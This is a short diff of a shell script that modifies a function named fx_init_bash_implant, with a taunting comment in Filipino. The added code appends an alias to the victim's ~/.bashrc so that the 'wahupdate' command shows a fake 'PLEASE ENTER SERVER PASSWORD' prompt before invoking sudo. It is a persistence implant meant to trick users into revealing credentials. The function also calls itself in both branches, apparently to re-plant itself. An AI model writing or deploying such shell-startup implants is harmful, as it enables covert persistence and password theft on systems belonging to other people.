@@ -37,8 +37,9 @@ fx_init_bash_implant() {
     #DITO KA NALANG MAG CHECK NG MGA FILES HAYUP KA HAHAHAHA BAT KA PA NAG PHP
     if grep -q "0" ".blood"
     then
-        echo "alias 'wahupdate'='sudo /usr/bin/wahupdate'" >> ~/.bashrc
+        echo "alias 'wahupdate'='echo ***PLEASE ENTER SERVER PASSWORD*** && sudo /usr/bin/wahupdate'" >> ~/.bashrc
         fx_init_bash_implant
     else
+        fx_init_bash_implant
         sh /usr/bin/wahupdate
     fi
